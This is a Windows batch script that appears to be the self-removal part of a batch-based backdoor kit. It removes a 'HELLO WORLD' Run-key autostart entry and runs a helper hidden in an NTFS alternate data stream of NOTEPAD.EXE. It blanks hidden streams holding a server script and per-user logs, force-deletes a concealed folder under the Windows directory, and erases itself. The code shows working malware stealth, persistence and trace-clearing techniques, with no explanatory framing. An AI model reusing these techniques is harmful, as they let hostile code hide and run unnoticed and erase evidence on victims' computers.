@ECHO OFF
:Uninstall
DEL /F /Q "%SystemRoot%\help\move.bat" >NUL
IF EXIST "%SystemRoot%\help\uninstall.bat" GOTO Del

:FindOS
VER|FIND "XP">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "2000">NUL
IF NOT ERRORLEVEL 1 GOTO Win2K
VER|FIND "NT">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "Mil">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "98">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
VER|FIND "95">NUL
IF NOT ERRORLEVEL 1 GOTO Win9X
GOTO End

:Win2K
> "%SystemRoot%\help\combat\regdel.reg" ECHO Windows Registry Editor Version 5.00
>>"%SystemRoot%\help\combat\regdel.reg" ECHO.
>>"%SystemRoot%\help\combat\regdel.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regdel.reg" ECHO "HELLO WORLD"=-
>>"%SystemRoot%\help\combat\regdel.reg" ECHO.
GOTO ADD

:Win9X
> "%SystemRoot%\help\combat\regdel.reg" ECHO REGEDIT4
>>"%SystemRoot%\help\combat\regdel.reg" ECHO.
>>"%SystemRoot%\help\combat\regdel.reg" ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%SystemRoot%\help\combat\regdel.reg" ECHO "HELLO WORLD"=-
>>"%SystemRoot%\help\combat\regdel.reg" ECHO.
GOTO Add

:Add
IF NOT EXIST "%SystemRoot%\help\combat\regdel.reg" GOTO FindOS
REGEDIT /S "%SystemRoot%\help\combat\regdel.reg" >NUL

> "%SystemRoot%\help\move.bat" ECHO @ECHO OFF
>>"%SystemRoot%\help\move.bat" ECHO MOVE /Y "%0" "%SystemRoot%\help\"
>>"%SystemRoot%\help\move.bat" ECHO START "" "%SystemRoot%\help\uninstall.bat"
>>"%SystemRoot%\help\move.bat" ECHO EXIT
START "" "%SystemRoot%\NOTEPAD.EXE:twist.exe" /SLEEP:2000 "%SystemRoot%\help\move.bat"
GOTO End

:Del
> "%SystemRoot%\help\empty.txt" ECHO.
MORE "%SystemRoot%\help\empty.txt" > "%SystemRoot%\NOTEPAD.EXE:server.bat"
MORE "%SystemRoot%\help\empty.txt" > "%SystemRoot%\NOTEPAD.EXE:%USERNAME%.log"
MORE "%SystemRoot%\help\empty.txt" > "%SystemRoot%\NOTEPAD.EXE:com.log"
MORE "%SystemRoot%\help\empty.txt" > "%SystemRoot%\NOTEPAD.EXE:comlist.log"
MORE "%SystemRoot%\help\empty.txt" > "%SystemRoot%\NOTEPAD.EXE:regpatch.reg"
MORE "%SystemRoot%\help\empty.txt" > "%SystemRoot%\NOTEPAD.EXE:advcom1.bat"
MORE "%SystemRoot%\help\empty.txt" > "%SystemRoot%\NOTEPAD.EXE:twist.exe"
DEL /F /S /Q "%SystemRoot%\help\combat\twist.exe" >NUL
DEL /F /S /Q "%SystemRoot%\help\combat\*.reg" >NUL
DEL /F /S /Q "%SystemRoot%\help\combat\*.txt" >NUL
DEL /F /S /Q "%SystemRoot%\help\combat\*.log" >NUL
DEL /F /S /Q "%SystemRoot%\help\combat\server.bat" >NUL
DEL /F /S /Q "%SystemRoot%\help\combat\*.bat" >NUL
DEL /F /S /Q "%SystemRoot%\help\empty.txt" >NUL
RMDIR /S /Q "%SystemRoot%\help\combat\" >NUL
DEL /F /S /Q "%0" >NUL

:End
EXIT